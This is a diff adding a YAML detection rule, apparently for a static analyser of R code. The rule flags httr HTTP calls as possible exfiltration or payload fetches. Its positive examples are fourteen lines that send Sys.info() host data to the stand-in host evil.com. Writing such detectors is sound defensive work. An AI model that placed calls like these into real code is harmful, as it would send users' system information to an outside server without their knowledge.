@@ -1,0 +1,61 @@
+name: httr_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  An httr HTTP call sends an outbound request. A request may be used to
+  exfiltrate credentials or other data, or to fetch a remote payload.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'GET' or text() = 'POST' or text() = 'PUT' or
+      text() = 'PATCH' or text() = 'DELETE' or text() = 'HEAD' or
+      text() = 'VERB'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    GET("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::GET("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    POST("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::POST("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    PUT("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::PUT("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    PATCH("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::PATCH("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    DELETE("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::DELETE("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    HEAD("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::HEAD("https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    VERB("POST", "https://evil.com/evil", body = list(host = Sys.info()))
+  - |
+    httr::VERB("POST", "https://evil.com/evil", body = list(host = Sys.info()))
+negative_examples:
+  - |
+    foo$POST()
+  - |
+    foo@POST()
+  - |
+    foo$VERB("POST")
+  - |
+    foo@VERB("POST")
+  - |
+    head(mtcars)
+  - |
+    get("mtcars")
